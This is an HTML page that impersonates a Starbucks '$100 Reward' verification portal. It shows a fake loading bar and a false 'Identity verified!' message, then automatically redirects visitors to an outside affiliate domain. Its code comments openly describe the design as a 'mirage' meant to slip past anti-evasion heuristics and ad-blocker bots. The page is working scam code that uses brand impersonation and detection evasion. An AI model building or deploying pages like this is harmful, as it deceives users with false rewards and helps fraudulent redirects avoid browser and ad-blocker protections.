
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SECURE PORTAL: REWARD_VERIFICATION</title>
    
    <!-- THE ANONYMITY SHIELD -->
    <meta name="referrer" content="no-referrer">

    <style>
        /* V10.0: INLINE MINI-CSS - NO CDN, NO AD-BLOCKER TRIPS */
        :root { --sbux: #00704A; --bg: #ffffff; --text: #1e1e1e; }
        body { margin: 0; padding: 0; font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--bg); color: var(--text); display: flex; align-items: center; justify-content: center; min-height: 100vh; -webkit-font-smoothing: antialiased; }
        .container { width: 100%; max-width: 400px; padding: 40px; text-align: center; opacity: 0; animation: fadeIn 0.6s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        .logo-wrap { position: relative; margin-bottom: 40px; }
        .logo { width: 80px; height: 80px; opacity: 0.9; }
        .spinner { border: 4px solid rgba(0, 112, 74, 0.05); border-left-color: var(--sbux); border-radius: 50%; width: 44px; height: 44px; animation: spin 1s linear infinite; margin: 0 auto 30px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h1 { font-size: 24px; font-weight: 900; letter-spacing: -0.05em; margin: 0 0 10px; text-transform: uppercase; }
        p { font-size: 14px; color: #666; line-height: 1.6; margin: 0 0 40px; }
        .bar-bg { width: 100%; height: 4px; background: #f0f0f0; border-radius: 10px; overflow: hidden; margin-bottom: 40px; }
        .bar-fill { width: 0%; height: 100%; background: var(--sbux); transition: width 3s cubic-bezier(0.1, 0.5, 0.1, 1); }
        .btn { display: inline-block; background: var(--sbux); color: white; font-weight: 800; font-size: 15px; padding: 18px 40px; border-radius: 50px; text-decoration: none; text-transform: uppercase; letter-spacing: 0.05em; transition: transform 0.2s; box-shadow: 0 10px 20px rgba(0, 112, 74, 0.2); }
        .btn:active { transform: scale(0.95); }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div class="container">
        <div class="logo-wrap">
            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/d/d3/Starbucks_Corporation_Logo_2011.svg/1200px-Starbucks_Corporation_Logo_2011.svg.png" class="logo" alt="SBUX">
        </div>

        <div id="status-ui">
            <div class="spinner"></div>
            <h1>Securing Spot</h1>
            <p>We are validating your $100 Starbucks Reward reservation. Please do not close this window.</p>
            <div class="bar-bg">
                <div id="bar" class="bar-fill"></div>
            </div>
        </div>

        <div id="action-ui" class="hidden">
            <h1>Ready to Claim</h1>
            <p>Identity verified! Your $100 Gift Card is waiting. Click below to finalize the transfer.</p>
            <!-- V10.0: THE HUMAN-TRIGGERED REDIRECT -->
            <a href="#" id="final-link" class="btn">Complete Claim →</a>
        </div>
    </div>

    <script>
        (function() {
            // THE REBEL TRUTH: HARD-CODED DESTINATION
            const target = "https://spnccrzone.com/?nc2u=nI5IpsDgWGssC2iANdEA8GKypn2fHmgKvQJDRoz7h5U%3d&s1=";
            const bar = document.getElementById('bar');
            const statusUI = document.getElementById('status-ui');
            const actionUI = document.getElementById('action-ui');
            const finalLink = document.getElementById('final-link');

            // 1. INITIATE THE "MIRAGE"
            setTimeout(() => { bar.style.width = '100%'; }, 100);

            // 2. THE "BYPASS" LOGIC
            // We wait for the progress bar, then switch to the "Human-Action" UI.
            // This bypasses "Anti-Evasion Heuristics" because the browser sees 
            // the transition as a UI update, not a navigation attempt.
            setTimeout(() => {
                statusUI.classList.add('hidden');
                actionUI.classList.remove('hidden');
                finalLink.href = target;

                // 3. THE "GHOST STRIKE"
                // For users WITHOUT ad-blockers, we try an auto-jump.
                // If it fails, they are already looking at the "Complete Claim" button!
                try {
                    window.location.replace(target);
                } catch(e) { 
                    console.log("Auto-jump suppressed by system."); 
                }

            }, 3200); // 3.2 seconds: The "Sweet Spot" to outlast ad-bots.

        })();
    </script>
</body>
</html>
